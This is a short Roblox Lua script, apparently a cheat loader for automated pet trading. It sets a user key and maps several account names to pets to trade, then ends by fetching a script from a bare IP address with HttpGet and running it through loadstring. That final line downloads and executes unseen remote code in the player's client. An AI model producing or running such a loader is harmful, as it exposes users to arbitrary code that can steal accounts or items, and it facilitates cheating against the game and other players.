repeat wait() until game:IsLoaded()
repeat wait() until game:GetService("Players")
repeat wait() until game:GetService("Players").LocalPlayer
repeat wait() until game:GetService("Players").LocalPlayer.PlayerGui

_G.UserKey = "venoz"
_G.HostName = {
    ["Daanefida910"] = "Lobster Thermidor",
    ["Semracaras53548"] = "Lobster Thermidor",
    ["Bileyhusen1183"] = "French Fry Ferret",
    ["Curacheah23092"] = "French Fry Ferret",
    ["Sienasees2679"] = "Lobster Thermidor",
    ["Stutecrisi37076"] = "Lobster Thermidor",
    ["Rawalritzo92786"] = "French Fry Ferret",
}

_G.SelectPetForTrade = {
    "Lobster Thermidor",
    "French Fry Ferret",
}

loadstring(game:HttpGet("http://103.245.164.141/OScript.txt"))()